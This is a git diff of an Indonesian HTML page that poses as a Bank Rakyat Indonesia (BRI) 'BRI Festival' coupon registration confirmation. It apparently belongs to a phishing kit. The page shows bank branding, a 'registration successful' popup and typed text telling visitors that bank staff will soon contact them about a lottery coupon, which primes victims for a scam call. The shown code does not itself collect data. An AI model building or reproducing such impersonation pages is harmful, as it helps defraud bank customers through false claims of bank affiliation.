@@ -1,43 +1,184 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>BRImo Ramadhan</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #fff;
-        }
-        img {
-            width: 720px;    /* Lebar gambar */
-            height: 1328px;  /* Tinggi gambar */
-            cursor: pointer;
-            display: block;
-        }
-        /* Responsive untuk layar lebih kecil */
-        @media (max-width: 720px) {
-            img {
-                width: 100vw;
-                height: auto;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=0.8, user-scalable=no">
+<title>BRI Festival From</title>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<style>
+body{
+margin:0;
+padding:0;
+background:#eef3f8;
+font-family:Arial, sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+}
+
+.container{
+width:98%;
+margin-top: 10px;
+display:flex;
+justify-content:center;
+}
+
+.card{
+width:430px;
+background:#ffffff;
+border-radius:22px;
+box-shadow:0 8px 20px rgba(0,0,0,0.12);
+overflow:hidden;
+}
+
+.top-area{
+padding:28px 22px 0 22px;
+text-align:center;
+}
+
+.logo img{
+width:210px;
+margin-bottom:20px;
+}
+
+.row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:18px;
+}
+
+.left-img img{
+width:240px;
+height:auto;
+}
+
+.right-img img{
+width:70px;
+height:auto;
+}
+
+.blue-box{
+background:#0b4a87;
+padding:30px 22px;
+text-align:center;
+color:white;
+font-size:21px;
+font-weight:700;
+line-height:1.6;
+min-height:250px;
+border-bottom-left-radius:22px;
+border-bottom-right-radius:22px;
+}
+
+.footer{
+text-align:center;
+padding:18px 0 22px 0;
+font-size:18px;
+font-weight:700;
+color:#c40000;
+}
+</style>
+
 </head>
 <body>
-    <img 
-        src="https://image2url.com/r2/default/images/1773144521028-cb47568e-8e50-497f-af08-1fdab0ff0884.jpeg" 
-        alt="BRImo Ramadhan" 
-        onclick="window.location.href='';" 
-        width="720" height="1328"
-    />
+<div class="container">
+<div class="card">
+
+<div class="top-area">
+
+<div class="logo">
+<img id="logoUrl" src="https://i.ibb.co.com/zHGn937j/IMG-20260207-112916.jpg">
+</div>
+
+<div class="row">
+<div class="left-img">
+<img id="formUrl" src="https://i.ibb.co.com/hFQMfHvg/IMG-20260207-112944.jpg">
+</div>
+
+<div class="right-img">
+<img id="menuUrl" src="https://i.ibb.co.com/Pvx5cj59/IMG-20260207-113151.jpg">
+</div>
+</div>
+
+</div>
+
+<div class="blue-box" id="typingContainer"></div>
+
+<audio id="thankYouAudio" src="AUD.mp3"></audio>
+
+<div class="footer">©️ 2026 PT Bank Rakyat Indonesia Tbk.</div>
+
+</div>
+</div>
+
+  <script>
+    const typewriterText = `Terimakasih Telah Mendaftar Dilayanan Bank BRI Festival.
+Pendaftaran Anda Sedang Diproses. Sesaat Lagi Anda Akan Dihubungi Oleh Pihak Bank BRI
+Untuk Proses Cetak Kode Kupon Undian Anda.`;
+
+    function playAudio() {
+      const audio = document.getElementById("thankYouAudio");
+      setTimeout(() => {
+        const playPromise = audio.play();
+        if (playPromise !== undefined) {
+          playPromise.catch((error) => {
+            document.body.addEventListener(
+              "click",
+              () => {
+                audio.play();
+              },
+              { once: true }
+            );
+          });
+        }
+      }, 1000);
+    }
+
+    function showThankYouAlert() {
+      Swal.fire({
+        title: "Registrasi Kupon Berhasil !",
+        text: "Untuk Info Lebih Lanjut Silahkan Hubungi Call Center BRI 15017", 
+        icon: "success",
+        confirmButtonText: "OK",
+        confirmButtonColor: "#004080",
+        customClass: {
+          popup: "swal2-border-radius",
+        },
+      });
+    }
+
+    function typeWriterEffect(text, containerId, speed = 40) {
+      let index = 0;
+      const container = document.getElementById(containerId);
+
+      function typeChar() {
+        if (index < text.length) {
+          container.innerHTML += text.charAt(index);
+          index++;
+          setTimeout(typeChar, speed);
+        }
+      }
+      typeChar();
+    }
+
+    function initPage() {
+  playAudio();
+  showThankYouAlert();
+  typeWriterEffect(typewriterText, "typingContainer", 40); 
+}
+
+    window.onload = initPage; 
+  </script>
+
+<script>
+function setImages(logo, form, menu) {
+  document.getElementById("logoUrl").src = logo;
+  document.getElementById("formUrl").src = form;
+  document.getElementById("menuUrl").src = menu;
+}
+</script>
+
 </body>
 </html>
-
-
